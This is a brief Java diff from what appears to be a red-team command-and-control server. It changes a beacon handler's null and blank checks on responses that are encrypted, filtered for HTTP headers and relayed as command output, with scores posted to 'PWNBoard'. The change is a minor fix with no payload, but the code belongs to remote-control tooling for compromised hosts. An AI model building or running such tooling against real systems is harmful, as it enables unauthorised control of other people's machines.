@@ -171,8 +171,8 @@ public class BeaconClientHandler implements Runnable{
                 } catch (IOException e){
                     System.out.println(IPAddress + " unable to update PWNBoard");
                 }
-                if(!(response.isBlank())){
-                    if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK"))){
+                if(response != null){
+                    if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                         response = encrypt(response);
                         if(!(response.equals("KEEP_ALIVE"))){
                             // Remove the END_OF_OUTPUT part of the end of the response to the command
